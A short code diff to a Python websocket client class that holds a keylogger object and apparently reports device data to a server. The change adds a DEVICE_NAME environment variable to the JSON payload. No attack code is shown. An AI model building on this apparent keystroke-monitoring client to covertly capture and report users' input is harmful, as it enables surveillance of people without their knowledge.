@@ -21,6 +21,7 @@ class ClientDisplayWebsocket:
         self.keylogger = keylogger
         self.api = api
         self.DEVICE_ID = os.getenv("DEVICE_ID")
+        self.DEVICE_NAME = os.getenv("DEVICE_NAME")
 
         self.prepare_client_thread = start_new_thread(self.prepare_client, ())
 
@@ -105,7 +106,7 @@ class ClientDisplayWebsocket:
                 },
                 'timestamp': str_timestamp,
                 'time': str_time,
-                'SO': 'N/D (SETEAR VAR)',
+                'so': self.DEVICE_NAME,
             }
 
             data_json_string = json.dumps(data, skipkeys=False,
